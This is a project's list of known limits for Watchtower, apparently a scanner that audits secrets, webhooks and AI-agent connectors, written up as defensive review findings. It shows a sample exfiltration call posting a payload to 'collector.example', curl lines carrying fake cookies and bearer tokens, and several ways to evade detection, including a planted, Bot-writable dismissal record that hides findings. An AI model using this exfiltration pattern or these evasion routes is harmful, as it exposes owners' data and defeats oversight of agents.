# Known limits

Open findings that dev carries knowingly. Each one is **must-fix before any release**.

## Batch 5 (merged to dev Oct 19, 2026: #15 and #16)

Ken approved merging #15 and #16 into dev on Oct 19, 2026 with these 7 Codex highs open. Forge fixes them after the freeze, before release. They're worded as Codex wrote them in its final checks after fix round 3: #15 at 62ccd0e and #16 at c3b0257. File links point at the code as merged.

**Status: open, must-fix before any release** (except 4 and 7, fixed in batch 6 PR1, branch `fix/batch6a`, and 3 and 6, fixed in batch 6 PR2, branch `fix/batch6b`; see each).

### From #15 (batch 5 PR A: platform notes, reviewed list, #11 follow-ups)

1. **high — [text.py:779](../watchtower/wt_parts/text.py): “Maybe” still permits realistic destination downgrades.**

   `requests.post(os.environ.get('HOOK', '<webhook>'), json=payload)` remains T018/**Install with changes** when `HOOK` actually selects `https://collector.example`. A sibling JSON configuration produces the same result; scanning that JSON separately raises no finding. Unknown-object `getattr`, `setdefault`, `pop`, environment-backed collections and reassigned destination variables also retain T018.

   The assertion conflict is real, but the two tests have different premises. The explicitly empty `config = {}` example can safely retain T018. The broader [safe-default assertions](../tests/test_batch5_codex_r2.py) include externally overridden values and codify this gap. The earlier blanket “fixed” assessment was too broad. Preserving those assertions does not establish safety.

   **Fix:** require evidence that the webhook is the selected destination. Preserve the proven empty-map case; correct assertions that treat unknown runtime defaults as established destinations.

2. **high — [text.py:748](../watchtower/wt_parts/text.py): Receiver naming introduces a new lookup bypass.**

   This complete example selects the collector:

   ```python
   cfg_client = {}
   url = cfg_client.get("<webhook>", "https://collector.example")
   requests.post(url, json=payload)
   ```

   It changes from T005 on `77dedd1` to T018/**Install with changes** on HEAD, despite the explicit collector URL. The `client` suffix makes the lookup appear to be HTTP GET. Conversely, `s = requests.Session(); s.get("<webhook>")` changes from T018 to critical T005.

   **Fix:** establish receiver identity from bindings/API use; a variable-name suffix must not authorize a destination downgrade.

3. **Fixed in batch 6 PR2 (fix/batch6b, "Fake keys and dismissals"), together with #15 medium 6 (masking idempotence; MASK_VERSION 8).** Replays: `tests/test_batch6_mask.py`. **high — [mask.py:689](../watchtower/wt_parts/mask.py): Additional credential flags still leak.**

   With `\<newline>` representing a continued shell word, these retain `FAKEz` through **`mask_secrets`, finding evidence and `save_approved()`**:

   - `curl --coo\<newline>kie 'sid=FAKEz' https://x.example`
   - `curl -\<newline>b 'sid=FAKEz' https://x.example`
   - `curl --oauth2-bea\<newline>rer FAKEz https://x.example`

   These are remaining coverage gaps, not newly introduced leaks. Version-6 copies containing them are migrated to **version 7 while retaining the secret**.

   **Fix:** recognize normalized curl cookie and OAuth bearer options, including their short/attached forms, and mask their credential values.

4. **high — [scanners.py:272](../watchtower/wt_parts/scanners.py): Missing mutable installation metadata still disables release checks.**

   A copy moved outside the default home, under a name other than `app`, without the adjacent commit record returns `installed_root() == None`, skips self-check and accepts planted reviewed-list bytes. A custom-home rename plus removal of its commit record does likewise. Changing `WATCHTOWER_HOME` does not restore protection.

   The “no `.git`” justification does not match the predicate: installation classification does not inspect `.git`. The newly added [checkout guard](../tests/test_batch5_codex_r3.py) explicitly preserves this bypass.

   **Fix:** keep reviewed-list, normalization and scanner trust bound to verified release provenance regardless of directory layout or missing state. Missing Bot-writable metadata must not grant unchecked trust.

   **Fixed in batch 6 PR1 (`fix/batch6a`):** every shipped rules file (platform lock, reviewed list, normalization spec, access and Ask-first vocabularies, scanner lock and its reader) is held to the running folder's `MANIFEST.sha256` in every layout; a missing manifest or line refuses the file with a note. Replays in `tests/test_batch6_release_files.py`.

### From #16 (batch 5 PR B: access map, threat brief)

5. **High — [collect.py:10](../watchtower/wt_parts/collect.py), [access.py:344](../watchtower/wt_parts/access.py), [access.py:460](../watchtower/wt_parts/access.py): Permission failures can still mean “absent.”**

   `isdir()`, `isfile()` and `lexists()` suppress permission errors into false results. These checks occur before the new error tracking or hardened opens. An unstatable scan root produces neither an error nor a skip; an inaccessible browser ancestor produces `(None, True)`; an inaccessible directory lookup produces `([], True)`.

   An in-memory `access_map_now()` replay with denied metadata lookups consequently returned no incompleteness, browser/MCP/CLI/plugin absence statements, `scheduled_jobs: 0`, and **“Watchtower found no Gmail connector, sign-in or webhook here.”** Ordinary errors *after* opening/listing a directory are handled correctly.

   **Fix:** distinguish confirmed absence from failed lookup. Propagate permission and other lookup errors through root collection, browser/seed checks, CLI discovery and scheduled-directory coverage.

6. **Fixed in batch 6 PR2 (fix/batch6b, "Fake keys and dismissals").** Replays: `tests/test_batch6_connectors.py`. **High — [access.py:136](../watchtower/wt_parts/access.py): Saved connector lists bypass malformed-answer validation.**

   A fresh reply with `connectors: [{"name":"Gmail"}]` becomes incomplete. The same value in saved `rollcall_findings.json` passes through `_ax_said()` as an empty, complete connector list.

   The full saved-record reader reproduced **“Golf: no connectors,”** `bot_connectors_complete: true`, and the Gmail absence sentence. `[123]` behaves similarly. A saved scalar `"Gmail"` instead becomes unknown but loses its canonical positive observation.

   **Fix:** apply the same normalization and validation on fresh replies, carried-over records and saved-file reads. Non-string list members must establish incompleteness; supported scalar strings should retain canonical labels.

7. **High — [golden_split.py:803](../tests/golden_split.py), [golden_split.py:996](../tests/golden_split.py): Requirements remain per scenario, not per run/output key.**

   Using the shipped item-a entries, I supplied one healthy audit and a second audit in the same scenario with its entire access addition omitted. The result remained **zero unexpected lines and zero unmet requirements**. The scenario sequences actually contain repeated audits.

   **Fix:** require each applicable `(scenario, output key/run)` independently, including outputs whose omission leaves them identical to baseline.

   **Fixed in batch 6 PR1 (`fix/batch6a`):** an exact-scenario `must_see` entry must match in every output of each of its scenarios that its `key_rx` names, those equal to the baseline included; pattern entries keep "any one scenario". Replays in `tests/test_batch6_golden_perkey.py`.

## Open mediums (batch 6 plan)

- **#16 medium 1:** the access JSON can exceed 4 KB; fixing it means making nested display lists trimmable in `fit` (a JSON shape change, broad golden churn, no security impact).
- **#16 medium 2, wording half:** "scheduled jobs" → "cron files / timers observed" would change every access line in every golden box; left for a wording-only batch. (The error/link half is planned for PR3.)

## Batch 6 PR2 (fix/batch6b, "Fake keys and dismissals"): follow-ups

KL3 and KL6 above are fixed in this PR; KL4 and KL7 in PR1; KL1, KL2 and KL5 are PR3's. B5 removed the name-based secret skips Ken named (gitleaks' `tests/`, `fixtures/`, `testdata/`, `*.test.*` path skips, the whole-line `$VAR`/placeholder rule, and `fixplan.py`'s FIXTURE_PATH). These name- or line-based rules are still in place and are logged here to be replaced by content checks in a later batch (**status: open follow-ups, not release blockers on their own**):

- **gitleaks path allowlist** ([secrets_pkgs.py](../watchtower/wt_parts/secrets_pkgs.py), `GITLEAKS_CONFIG`): package stores and caches (`node_modules`, `.cache`, `site-packages`, `go/pkg`, …), browser profiles, the named credential files, Watchtower's own folders, lockfiles and `marketplace.json`, and every `.h` file are never read by gitleaks.
- **gitleaks whole-line rules**: a line with `x-amz-credential=` / `X-Amz-Signature=` or `?AWSAccessKeyId=` / `Signature=` / `Expires=` hides every other hit on that line.
- **`in_toolchain_tree`** ([secrets_pkgs.py](../watchtower/wt_parts/secrets_pkgs.py)): gitleaks hits under Go, pnpm, rustup and cargo trees are counted, not listed.
- **`SAMPLE_SKILL_PATH`** ([collect.py](../watchtower/wt_parts/collect.py), used by [scope.py](../watchtower/wt_parts/scope.py)): a skill under a `tests/`, `fixtures/`, `examples/`, `docs/` or `references/` segment outside the loadable locations isn't scored as installed (keys there are still reported: SECRET_RULES count wherever they sit).

Limits of the new behavior, kept knowingly:

- **B5 (as of Codex round 2, Ken's rule: nothing a Bot can write lowers or hides a finding):** no secret hit is left out on how it looks. A value that looks like an example (FAKE or EXAMPLE right after an optional provider prefix, only placeholder words such as `your-api-key-here`, one 1-4 character unit repeated, `<…>`, a whole `$VAR`/`${VAR}`/`${{ secrets.X }}`/`%X%`/`process.env.X`/`***` reference, a key block whose body decodes cleanly to no private key structure or has under 64 base64 characters, a hex or `integrity` value whose own line has a checksum format) is a **low** finding titled "Looks like an example or checksum value - check it", Worth a look, never Confirmed (it backs nothing up and nothing backs it up), never given a revoke link, never on the scrub list, never cleared as a dead key; a key TruffleHog's provider says is live there is critical as anywhere. That lowering is what is left: anyone can write a working credential as `FAKE<64 hex>`, `sha256:<hex>` or `<…>`, and it shows as low, with its file and line, for the owner to check. gitleaks hits in an ordinary folder are listed one finding per file with every line; in the folders that fill up with machine output (agent transcripts, tool output, `.cursor/projects`) one per folder, as real hits there are, its evidence naming the files and lines (cut at 160 characters when stored). A gitleaks hit is read only at the place gitleaks reported, only when the bytes there are gitleaks' Match with gitleaks' Entropy, only when the whole file is at most 100,000 bytes or the hit's first line ends inside the first 100,000 (gitleaks' later pieces count columns from where they start, which Watchtower can't know), and only in bytes whose change time is before gitleaks started (`_read_unchanged`, so they are the bytes gitleaks read; the kernel sets change times, but a clock stepped backwards or a filesystem with coarse times could in principle let a change through: the hit is then still listed, low). Anything else keeps the severity gitleaks' rule gives it. gitleaks' config and report are in a new private folder (`PrivateDir`: mkdtemp, 0700, held by a checked descriptor, the report read through it without following a link, one link, this user's), never in `state/`; `state/gitleaks.toml` is still written as the owner's copy and never read. A process running as the same user can still change files in that folder while gitleaks runs (any defence on one account is best-effort); a linked or missing report is "gitleaks FAILED … NOT checked", never "no hits". A key block is real whenever any reading of what is between BEGIN and END finds a key structure where a line starts, and nothing on a line is ever left out: the readings are the text as it is (its lines, `\n` escapes as line breaks) and, only when the whole of it is exactly string literals in code, their contents; PGP armor headers and its checksum line are its syntax; anything else on a line (`<base64> # ""`) makes it unread, so real.
- **B6 / DQ-045 (as of Codex round 2): NOT fixed in this PR.** `state/dismissed.jsonl` can be written by a Bot, and a Bot can read a skill's source and compute any digest of it, so round 1's hold (a dismissal surviving an unrelated edit for a medium-or-lower finding with a matching `ev256`) let a planted record hide a counted finding (Codex round 2, 6), and `dismiss` made the record's digest from whatever the file held then (7). Reverted: a dismissal sets aside only a Worth-a-look finding, as at 5dcd0a2. A finding dismissed before and now backed up by something (most often the change to its file) counts again, and its fix starts "You dismissed this before; it is back because the file changed (see WT-I001)" (or "… because something else now backs it up"). `ev256`, `command_span`, `source_ev256`, `held_dismissal` and `drift_only_keys` are gone. A dismissal that survives an unrelated edit needs a dismissal authority outside Bot-writable storage (an owner-only channel or signature): **Ken's decision, open**. Kept from round 1: each finding's dismissal is judged before findings are grouped, so a dismissed group leader never hides another file's finding.
- **KL3 test change:** `tests/test_batch5_codex_r3.py::ShortAfterJoins::test_in_an_approved_copy` asserted `masked == 7`; MASK_VERSION 8 made it fail. Approved and listed: `masked == 7 -> masked == 8` (the literal, not `MASK_VERSION`).
- **Codex round 1 on a986d54 (10 high, 1 medium):** all fixed, replays in `tests/test_batch6_codex_r1.py`. Three assertions of tests added in 29ac33b changed with the fixes (a checksum test's input, and two B6 tests where a raw-high T004 or a record without `ev256` no longer holds); each is listed old → new in CHANGELOG.
- **Codex round 2 on de3b328 (12 high):** fixed as above (B5 by listing, never dropping; B6 by reverting the hold, DQ-045 left open), replays in `tests/test_batch6_codex_r2.py`. Key blocks are masked by one pass with no size cap (`pem_spans`): an unfinished block is hidden to the end of the text, so prose that only names a BEGIN line (no END) loses the rest of that text in stored copies; MASK_VERSION stays 8 (this PR introduced 8, so no released copy was masked by round 1's capped reader). Tests added in this PR whose assertions changed are listed old → new in CHANGELOG.
